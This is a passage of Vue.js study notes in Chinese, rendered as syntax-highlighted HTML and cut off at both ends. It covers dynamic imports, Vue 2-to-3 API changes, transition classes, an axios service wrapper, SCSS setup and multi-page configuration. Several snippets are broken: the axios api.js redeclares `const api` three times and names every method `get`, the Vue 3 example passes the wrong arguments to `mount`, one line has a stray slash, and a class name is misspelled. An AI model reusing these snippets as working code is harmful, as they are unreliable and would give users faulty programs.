Contact page.\n    &lt;p>&lt;input type=\"text\" placeholder=\"Type your name here...\">&lt;/p>\n  &lt;/div></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    currentView<span class=\"token operator\">:</span> <span class=\"token string\">\"home\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">changeTab</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>currentView <span class=\"token operator\">=</span> v<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"dynamic-import\">Dynamic import</h4>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// 同期（普通）</span>\n<span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">as</span> FileSaver <span class=\"token keyword\">from</span> <span class=\"token string\">\"file-saver\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// ==></span>\n\n<span class=\"token comment\">// 非同期</span>\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">FileSaverAsync</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">import</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file-saver\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// --------</span>\n\n<span class=\"token keyword\">import</span> JSZip <span class=\"token keyword\">from</span> <span class=\"token string\">\"jszip\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// ==></span>\n\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">JSZipAsync</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">import</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"jszip\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">p</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> p<span class=\"token punctuation\">.</span>default<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// ---------</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"filepond/dist/filepond.min.css\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// ==></span>\n\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"filepond/dist/filepond.min.css\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h2 id=\"vue-3\">Vue 3</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/peerone-technology-%E7%9A%AE%E5%81%B6%E7%8E%A9%E4%BA%92%E5%8B%95%E7%A7%91%E6%8A%80/vue-3-%E7%8B%80%E6%85%8B%E7%AE%A1%E7%90%86%E5%85%B6%E5%AE%83%E6%96%B9%E6%A1%88-%E8%B7%9F-vuex-%E8%AA%AA%E5%86%8D%E8%A6%8B-8ad01f34f4ed\">Vue 3 狀態管理其它方案！跟 Vuex 說再見 ?. 教你如何在 Vue 3 利用 Provide 和 Inject 實作狀態管理！</a></li>\n</ul>\n<h3 id=\"global-api\">Global API</h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> Vue <span class=\"token keyword\">from</span> <span class=\"token string\">\"vue\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> App <span class=\"token keyword\">from</span> <span class=\"token string\">\"./App.vue\"</span><span class=\"token punctuation\">;</span>\n\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token comment\">/* ... */</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">mixin</span><span class=\"token punctuation\">(</span><span class=\"token comment\">/* ... */</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token comment\">/* ... */</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">directive</span><span class=\"token punctuation\">(</span><span class=\"token comment\">/* ... */</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  <span class=\"token function-variable function\">render</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">h</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">h</span><span class=\"token punctuation\">(</span>App<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">$mount</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>↓</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> createApp <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"vue\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> App <span class=\"token keyword\">from</span> <span class=\"token string\">\"./App.vue\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token function\">createApp</span><span class=\"token punctuation\">(</span>App<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token comment\">/* ... */</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">mixin</span><span class=\"token punctuation\">(</span><span class=\"token comment\">/* ... */</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token comment\">/* ... */</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">directive</span><span class=\"token punctuation\">(</span><span class=\"token comment\">/* ... */</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">mount</span><span class=\"token punctuation\">(</span>App<span class=\"token punctuation\">,</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"global-api-tree-shaking\">Global API Tree Shaking</h3>\n<ul>\n<li><code>Vue.nextTick</code></li>\n<li><code>Vue.observable</code></li>\n<li><code>Vue.version</code></li>\n<li><code>Vue.compile</code></li>\n<li><code>Vue.set</code></li>\n<li><code>Vue.delete</code></li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> Vue <span class=\"token keyword\">from</span> <span class=\"token string\">\"vue\"</span><span class=\"token punctuation\">;</span>\n\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">nextTick</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// something DOM-related</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>↓</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> nextTick <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"vue\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">nextTick</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// something DOM-related</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"v-model-1\">v-model</h3>\n<p><code>&lt;Comp :value=&#39;pageTitle&#39; @input=&#39;pageTitle=$event&#39; /&gt;</code>\n↓\n<code>&lt;Comp :modelValue=&#39;pageTitle&#39; @update:modelValue=&#39;pageTitle=$event&#39; /&gt;</code></p>\n<h3 id=\"functional-component\">Functional Component</h3>\n<p><code>import { h } from &#39;vue&#39;</code></p>\n<h3 id=\"composition-api\">Composition API</h3>\n<h2 id=\"應用\">應用</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://kantai235.github.io/FrontendWorkWithBackend/\">Vue 前端工程師與 Laravel 後端工程師的權責分配問題</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/ok-bokujou/items/a0c3c5233749e6e32abc\">【Vue.js×Firebase】3 日で位置共有 WEB サービスを作った話【個人開発】</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/G4RDSjp/items/12a48f8c3e146e3545b2\">Nuxt で毎日やりたいことを習慣づける Web アプリ「コツコツ忍者」を作った 🏃‍♀️【個人開発】</a></li>\n</ul>\n<h3 id=\"動畫-transition-標籤\">動畫 (<code>transition</code> 標籤)</h3>\n<ul>\n<li>將想加入動畫效果的元素放進 <code>&lt;transition&gt;</code> 與 <code>&lt;/transition&gt;</code> 標籤之間\n若是想同時渲染整個列表，例如使用 <code>v-for</code> 的時候，可使用 <code>&lt;transition-group&gt;</code> 與 <code>&lt;/transition-group&gt;</code></li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>transition<span class=\"token operator\">-</span>group name<span class=\"token operator\">=</span><span class=\"token string\">\"list\"</span> tag<span class=\"token operator\">=</span><span class=\"token string\">\"p\"</span><span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span>span v<span class=\"token operator\">-</span><span class=\"token keyword\">for</span><span class=\"token operator\">=</span><span class=\"token string\">\"item in items\"</span> v<span class=\"token operator\">-</span>bind<span class=\"token operator\">:</span>key<span class=\"token operator\">=</span><span class=\"token string\">\"item\"</span> <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"list-item\"</span><span class=\"token operator\">></span>\n    <span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> item <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>transition<span class=\"token operator\">-</span>group<span class=\"token operator\">></span></code></pre><ul>\n<li>Vue 的動畫由 6 個 class 定義切換狀態</li>\n</ul>\n<ol>\n<li><code>.v-enter</code>: 進入切換後的初始狀態</li>\n<li><code>.v-enter-active</code>: 進入切換生效中的狀態</li>\n<li><code>.v-enter-to</code>: 切換結束的狀態，適用於 2.1.8 版本之後</li>\n<li><code>.v-leave</code>: 離開切換的開始狀態</li>\n<li><code>.v-leave-actiove</code>: 離開切換生效中的狀態</li>\n<li><code>.v-leave-to</code>: 切換結束的狀態，適用於 2.1.8 版本之後</li>\n</ol>\n<ul>\n<li>以及 <code>.v-move</code> 套用於改變狀態時的過程</li>\n<li>可加上 <code>name=&quot;my-transition&quot;</code> 屬性，<code>v-enter</code> 會替換成 <code>my-transition-enter</code>，可自行定義動畫名稱。</li>\n<li>亦可將去除 <code>v-</code> 的狀態名後加上 <code>-class</code> 當成屬性，自行定義切換動畫的 class。</li>\n<li>可加上 <code>mode=&quot;in-out&quot;</code> 屬性設定新元素先執行進入切換動畫，當前元素再執行離開切換， <code>out-in</code> 反之。</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>transition\n  name<span class=\"token operator\">=</span><span class=\"token string\">\"custom-classes-transition\"</span>\n  enter<span class=\"token operator\">-</span>active<span class=\"token operator\">-</span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"animated tada\"</span>\n  leave<span class=\"token operator\">-</span>active<span class=\"token operator\">-</span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"animated bounceOutRight\"</span>\n<span class=\"token operator\">></span>\n  <span class=\"token operator\">&lt;</span>p v<span class=\"token operator\">-</span><span class=\"token keyword\">if</span><span class=\"token operator\">=</span><span class=\"token string\">\"show\"</span><span class=\"token operator\">></span>hello<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>p<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>transition<span class=\"token operator\">></span></code></pre><h3 id=\"axios\">axios</h3>\n<ol>\n<li><code>npm i axios vue-axios json-server</code></li>\n<li>在 <code>src/</code> 裡新增 <code>service</code> 資料夾，並在裡頭新增 <code>api.js</code></li>\n</ol>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">/* api.js */</span>\n\n<span class=\"token keyword\">import</span> axios <span class=\"token keyword\">from</span> <span class=\"token string\">'axios'</span>\naxios<span class=\"token punctuation\">.</span>defaults<span class=\"token punctuation\">.</span>baseURL <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n\n<span class=\"token comment\">// GET</span>\n<span class=\"token keyword\">const</span> api <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">async</span> <span class=\"token function\">get</span> <span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> res <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> axios<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> params<span class=\"token operator\">:</span> data <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    res <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>data\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\n<span class=\"token comment\">// POST</span>\n<span class=\"token keyword\">const</span> api <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">async</span> <span class=\"token function\">get</span> <span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> res <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> axios<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    res <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>data\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\n<span class=\"token comment\">// DELETE</span>\n<span class=\"token keyword\">const</span> api <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">async</span> <span class=\"token function\">get</span> <span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> res <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> axios<span class=\"token punctuation\">.</span><span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>params<span class=\"token operator\">:</span> data<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    res <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>data\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> api</code></pre><ol start=\"3\">\n<li>在欲使用的頁面中調用</li>\n</ol>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">data</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n        tableData<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">async</span> <span class=\"token function\">packageGetData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> source <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost:3000/tableData\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">let</span> res <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>$api<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>source<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>tableData <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>res<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">/</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\n    <span class=\"token function\">created</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">packageGetData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"使用-scss\">使用 SCSS</h3>\n<h4 id=\"1-引入至-component\">1. 引入至 Component</h4>\n<p><code>component.vue</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">scoped</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>scss<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token atrule\"><span class=\"token rule\">@import</span> <span class=\"token string\">\"../assets/scss/component.scss\"</span><span class=\"token punctuation\">;</span></span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"2-引入至-appvue\">2. 引入至 App.vue</h4>\n<p><code>App.vue</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>scss<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token atrule\"><span class=\"token rule\">@import</span> <span class=\"token string\">\"../assets/scss/main.scss\"</span><span class=\"token punctuation\">;</span></span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"3-引入至-mainjs\">3. 引入至 main.js</h4>\n<p><code>main.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">import</span> <span class=\"token string\">\"@/assets/scss/main.scss\"</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"4-從-webpack-引入\">4. 從 webpack 引入</h4>\n<p><code>npm i --save-dev node-sass sass-loader</code></p>\n<p><code>vue.config.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  css<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    loaderOptions<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      sass<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        prependData<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\n          @import \"@/assets/scss/main.scss\";\n        </span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"連結-google-charts\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/i_ryo/pen/eqpMNQ\">連結 Google Charts</a></h3>\n<h3 id=\"讀取-json-資料-axios\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/i_ryo/pen/jRJoQp\">讀取 JSON 資料 (axios)</a></h3>\n<h3 id=\"使用-localstorage-儲存資料\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/i_ryo/pen/NQbLPR\">使用 <code>localStorage</code> 儲存資料</a></h3>\n<h3 id=\"multi-page-mode\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@nchuuu/%E5%88%A9%E7%94%A8vue-cli-%E9%80%B2%E8%A1%8C%E5%A4%9A%E9%A0%81%E6%89%93%E5%8C%85-633b39bb157\">multi-page mode</a></h3>\n<p><code>vue.config.js</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  pages<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    index<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token comment\">// entry for the page</span>\n      entry<span class=\"token operator\">:</span> <span class=\"token string\">\"src/index/main.js\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token comment\">// the source template</span>\n      template<span class=\"token operator\">:</span> <span class=\"token string\">\"public/index.html\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token comment\">// output as dist/index.html</span>\n      filename<span class=\"token operator\">:</span> <span class=\"token string\">\"index.html\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token comment\">// when using title option,</span>\n      <span class=\"token comment\">// template title tag needs to be &lt;title>&lt;%= htmlWebpackPlugin.options.title %>&lt;/title></span>\n      title<span class=\"token operator\">:</span> <span class=\"token string\">\"Index Page\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token comment\">// chunks to include on this page, by default includes</span>\n      <span class=\"token comment\">// extracted common chunks and vendor chunks.</span>\n      chunks<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"chunk-vendors\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"chunk-common\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"index\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre><h2 id=\"延伸框架\">延伸框架</h2>\n<h3 id=\"vuex\">Vuex</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/@chupai/BJA4FwcJL\">Vuex 起手式 - HackMD</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/users/20107601/ironman/1454\">Vuex 學習筆記 :: 2018 iT 邦幫忙鐵人賽</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://vuex.vuejs.org/\">Vuex</a> 參考 Flux design pattern 與 Redux 狀態管理模式</li>\n<li>將 <code>單向資料流 Flux 設計模式</code> 實作進 Vue 框架中，取 <code>flux</code> 中的 <code>x</code> 得名</li>\n<li>使用單一狀態樹統一管理應用程式的所有狀態，並儲存狀態（<code>state</code>）於 <code>store</code></li>\n</ul>\n<h4 id=\"actions\"><code>Actions</code>:</h4>\n<ol>\n<li>定義 App 的所有行為\n前端組件觸發事件時會 <code>dispatch</code> 給 